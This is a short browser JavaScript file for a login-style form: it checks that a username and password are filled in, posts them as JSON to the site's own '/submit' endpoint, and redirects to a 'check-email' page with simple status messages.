console.log("JS is connected")
const usernameInput = document.getElementById('username');
const PasswordInput = document.getElementById('password');
const submitBtn = document.getElementById('submit-btn');
const statusSpan = document.getElementById('status');

if (submitBtn) {
    submitBtn.addEventListener('click', async () => {
        const username = usernameInput.value.trim();
        const password = PasswordInput.value.trim();

        if (!username || !password) {
            statusSpan.textContent = 'Please fill in both fields.';
            return;
        }

        statusSpan.textContent = 'Sending... ';

        try {
            const res = await fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password})
            });

            if (res.ok) {
                // Small delay so you can see the status change
                statusSpan.textContent = 'Saved. Redirecting... ';
                setTimeout(() => {
                    window.location.href = 'check-email.html';
                }, 700);
            } else {
                statusSpan.textContent = 'Error saving data.';
            }
        } catch (err) {
            statusSpan.textContent = 'Network error.';
        }
    });
}